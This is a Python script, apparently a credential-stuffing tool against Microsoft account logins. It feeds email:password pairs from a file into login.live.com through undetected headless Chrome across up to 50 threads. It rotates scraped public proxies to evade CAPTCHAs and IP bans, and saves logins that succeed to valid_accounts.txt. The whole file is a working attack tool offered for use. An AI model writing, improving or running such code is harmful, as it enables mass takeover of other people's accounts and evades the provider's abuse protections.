import time
import threading
from queue import Queue, Empty
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.common.exceptions import TimeoutException, WebDriverException
import requests
from concurrent.futures import ThreadPoolExecutor
import logging
import warnings

INPUT_FILE = "accounts.txt"
OUTPUT_FILE = "valid_accounts.txt"

PROXY_APIS = [
    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=1000&country=all",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://api.openproxylist.xyz/http.txt",
    "https://proxyspace.pro/http.txt"
]

LOGIN_URL = "https://login.live.com/"
MAX_TABS = 50

account_queue = Queue()
valid_lock = threading.Lock()
proxy_lock = threading.Lock()

proxies = []
proxy_index = 0
checked_count = 0
success_count = 0
fail_count = 0
error_count = 0

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(message)s")
warnings.filterwarnings("ignore", category=UserWarning)

def fetch_proxies(required_count):
    global proxies
    new_proxies = set()
    for api in PROXY_APIS:
        logging.info(f"I am checking proxy API: {api}")
        try:
            resp = requests.get(api, timeout=10)
            if resp.status_code == 200:
                lines = resp.text.splitlines()
                for line in lines:
                    line = line.strip()
                    if line and ':' in line:
                        new_proxies.add(line)
                    if len(new_proxies) >= required_count * 5:
                        break
            if len(new_proxies) >= required_count * 5:
                break
        except:
            pass
    def test_proxy(proxy):
        try:
            response = requests.get("http://www.example.com", proxies={"http": f"http://{proxy}", "https": f"http://{proxy}"}, timeout=5)
            if response.status_code == 200:
                return proxy
        except:
            return None
        return None
    with ThreadPoolExecutor(max_workers=50) as executor:
        results = list(executor.map(test_proxy, new_proxies))
    proxies[:] = [proxy for proxy in results if proxy]
    logging.info(f"Found {len(proxies)} working proxies")

def get_next_proxy():
    global proxy_index
    with proxy_lock:
        if not proxies:
            return None
        proxy = proxies[proxy_index % len(proxies)]
        proxy_index += 1
        return proxy

def check_ip_ban(driver):
    current_url = driver.current_url.lower()
    page_source = driver.page_source.lower()
    if ("captcha" in current_url) or ("captcha" in page_source):
        return True
    if "access denied" in page_source:
        return True
    if "unusual traffic" in page_source:
        return True
    if "try again later" in page_source:
        return True
    return False

def check_account(email, password, proxy=None):
    options = uc.ChromeOptions()
    options.headless = True
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    if proxy:
        options.add_argument(f'--proxy-server=http://{proxy}')
    try:
        driver = uc.Chrome(options=options, version_main=120)
        driver.set_page_load_timeout(20)
        driver.get(LOGIN_URL)
        time.sleep(1)
        email_input = driver.find_element(By.NAME, "loginfmt")
        email_input.send_keys(email)
        driver.find_element(By.ID, "idSIButton9").click()
        time.sleep(1)
        password_input = driver.find_element(By.NAME, "passwd")
        password_input.send_keys(password)
        driver.find_element(By.ID, "idSIButton9").click()
        time.sleep(3)
        if check_ip_ban(driver):
            return "ban"
        if "signin" in driver.current_url.lower():
            return False
        title = driver.title.lower()
        if "outlook" in title or "microsoft" in title or "office" in title:
            return True
        page_source = driver.page_source.lower()
        if "incorrect password" in page_source or "that microsoft account doesn't exist" in page_source:
            return False
        return True
    except (TimeoutException, WebDriverException):
        return "error"
    except:
        return False
    finally:
        try:
            driver.quit()
        except:
            pass

def worker():
    global checked_count, success_count, fail_count, error_count
    while True:
        try:
            email, password = account_queue.get(timeout=10)
        except Empty:
            break
        logging.info(f"Checking account: {email}")
        retries = 3
        proxy = None
        result = None
        for _ in range(retries):
            proxy = get_next_proxy()
            result = check_account(email, password, proxy)
            if result == "ban":
                with proxy_lock:
                    if proxy in proxies:
                        proxies.remove(proxy)
                if len(proxies) < 10:
                    fetch_proxies(1000)
                continue
            if result == "error":
                continue
            break
        with valid_lock:
            checked_count += 1
            if result is True:
                success_count += 1
                with open(OUTPUT_FILE, "a") as f:
                    f.write(f"{email}:{password}\n")
            elif result == "error":
                error_count += 1
            else:
                fail_count += 1
        account_queue.task_done()

def determine_proxy_count(account_count):
    if account_count < 10:
        return 0
    elif account_count < 100:
        return 10
    elif account_count < 1000:
        return 100
    else:
        return 1000

def main():
    with open(INPUT_FILE, "r") as f:
        accounts = [line.strip() for line in f if ":" in line]
    account_count = len(accounts)
    proxy_count = determine_proxy_count(account_count)
    if proxy_count > 0:
        fetch_proxies(proxy_count)
    logging.info("Found enough proxies, starting to check accounts...")
    for account in accounts:
        email, password = account.split(":", 1)
        account_queue.put((email, password))
    thread_count = min(MAX_TABS, account_count)
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads.append(t)
    account_queue.join()

    logging.info("=== CHECK SUMMARY ===")
    logging.info(f"Total accounts checked: {checked_count}")
    logging.info(f"Successful logins: {success_count}")
    logging.info(f"Failed logins: {fail_count}")
    logging.info(f"Errors: {error_count}")

if __name__ == "__main__":
    main()